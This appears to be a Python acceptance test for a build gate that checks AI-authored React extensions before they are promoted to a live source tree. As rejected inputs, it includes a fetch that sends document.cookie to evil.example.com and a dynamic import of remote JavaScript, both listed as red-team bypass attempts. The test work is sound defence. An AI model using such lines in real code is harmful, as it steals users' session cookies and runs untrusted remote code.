"""tests/extension_acceptance.py — the self-coding subsystem's BUILD-GATE (slice 15).

The object of proof is the GOVERNED LOOP, not the code: a broken brain-authored extension is
CAUGHT by the build-gate and NEVER written to the live tree; only a passing candidate is
promoted. (Code correctness is the model's; we certify the gate.) The happy path + git-revert
recovery are proven by use in the browser. Runs against the real canvas/app (the gate needs it).
"""
import os, sys, tempfile, shutil

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from store.fs_store import FsStore
from runtime.registry import NodeRegistry
from runtime.suite import Suite

NODES = os.path.join(ROOT, "nodes")
EXTDIR = os.path.join(ROOT, "canvas", "app", "src", "extensions")
PASS = 0


def check(label, cond):
    global PASS
    assert cond, f"FAIL: {label}"
    PASS += 1
    print(f"  ok  {label}")


store_dir = tempfile.mkdtemp(prefix="ext-test-")
try:
    store = FsStore(os.path.join(store_dir, "store"))
    reg = NodeRegistry(); reg.discover([NODES])
    suite = Suite(store, reg, nodes_dir=NODES)

    valid = "import { useState } from 'react'\nexport default function Demo(){ const [n]=useState(0); return <div>hi {n}</div> }\n"
    syntax_bad = "export default function Demo(){ return <div>oops</div }\n"
    import_bad = "import axios from 'axios'\nexport default function Demo(){ return <div/> }\n"
    bare_bad = "import './styles.css'\nexport default function Demo(){ return <div/> }\n"

    # the gate (AST-checked): passes valid, rejects each break-the-build / dangerous class
    check("gate passes valid react code", suite._gate_extension(valid) is None)
    check("gate passes valid /api fetch", suite._gate_extension(
        "export default function X(){ fetch('/api/now'); return <div/> }") is None)
    check("gate rejects a SYNTAX error", bool(suite._gate_extension(syntax_bad)))
    check("gate rejects a non-react import", bool(suite._gate_extension(import_bad)))
    check("gate rejects a bare import", bool(suite._gate_extension(bare_bad)))
    # red-team B1 bypasses — all must now be REJECTED (AST, not regex)
    check("gate rejects dynamic import() of a URL (RCE vector)", bool(suite._gate_extension(
        "export default function X(){ import('https://evil.example.com/x.js'); return <div/> }")))
    check("gate rejects `export * from 'axios'` (build-break)", bool(suite._gate_extension(
        "export * from 'axios'\nexport default function X(){ return <div/> }")))
    check("gate rejects `export { x } from 'axios'`", bool(suite._gate_extension(
        "export { default as ax } from 'axios'\nexport default function X(){ return <div/> }")))
    check("gate rejects spaced require ()", bool(suite._gate_extension(
        "const fs = require ('fs')\nexport default function X(){ return <div/> }")))
    check("gate rejects fetch to an external URL (exfil)", bool(suite._gate_extension(
        "export default function X(){ fetch('https://evil.example.com/?c='+document.cookie); return <div/> }")))

    # THE decisive property: an operator-approved BROKEN extension is rejected + NEVER written live
    name = "gatetest_broken_xyz"
    live_path = os.path.join(EXTDIR, name + ".tsx")
    assert not os.path.exists(live_path), "precondition: test file absent"
    sid = suite.inbox.surface("ui_extension", {"name": name, "code": syntax_bad}, default="reject", resolved=None)
    suite.resolve_surfaced(sid, "approve")              # operator approved — but the GATE still guards
    r = suite.apply_extension(sid)
    check("broken extension is rejected by the gate", r["rejected"] is True and r["error"])
    check("broken extension was NEVER written to the live tree (canvas untouched)", not os.path.exists(live_path))

    # operator-approval is not a bypass: a non-react import, even approved, is rejected
    sid2 = suite.inbox.surface("ui_extension", {"name": "gatetest_imp_xyz", "code": import_bad}, default="reject", resolved=None)
    suite.resolve_surfaced(sid2, "approve")
    r2 = suite.apply_extension(sid2)
    check("approved-but-unsafe import is still rejected (approval ≠ safety)", r2["rejected"] is True)
    check("its file was not written either", not os.path.exists(os.path.join(EXTDIR, "gatetest_imp_xyz.tsx")))

    print(f"\nALL {PASS} CHECKS PASS — build-gate catches broken code; it never reaches the live tree")
finally:
    shutil.rmtree(store_dir, ignore_errors=True)
